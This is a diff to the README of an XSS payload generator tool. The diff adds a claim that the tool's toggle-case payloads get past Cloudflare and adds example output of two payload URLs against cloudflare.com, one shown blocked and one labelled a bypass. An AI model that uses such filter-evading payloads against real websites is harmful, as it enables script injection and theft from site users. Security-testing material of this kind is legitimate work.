@@ -6,7 +6,7 @@ This Python script generates XSS (Cross-Site Scripting) payloads for various HTM
 
 - Generates XSS payloads for a wide range of HTML tags.
 - Includes common XSS payload patterns and techniques.
-- Generates toggle case variations for JavaScript functions to bypass security filters.
+- Generates toggle case variations for JavaScript functions to bypass security filters such as Cloudflare.
 - URL encodes the payloads for easy use in testing.
 
 ## Prerequisites
@@ -21,7 +21,11 @@ This Python script generates XSS (Cross-Site Scripting) payloads for various HTM
    cd xss-payload-gen
    ```
 ## Usage
-Before running the script, you should replace {base_url} with any website to test the payload on.
 ```bash
-python generate_xss_payloads.py
+python xss-gen.py https://example.com/
+```
+## Example Output
+```bash 
+https://www.cloudflare.com/<a x=xxxxxxx onclick="SEtINTErval('Meshari-Almalki');"> [403] [Attention Required! | Cloudflare] -> Blocked by Cloudflare
+https://cloudflare.com/<a x=xxxxxxx style="x:expression(SetINtervAL(Meshari-Almalki!););"> [301] [301 Moved Permanently]    -> Bypass the Cloudflare
 ```
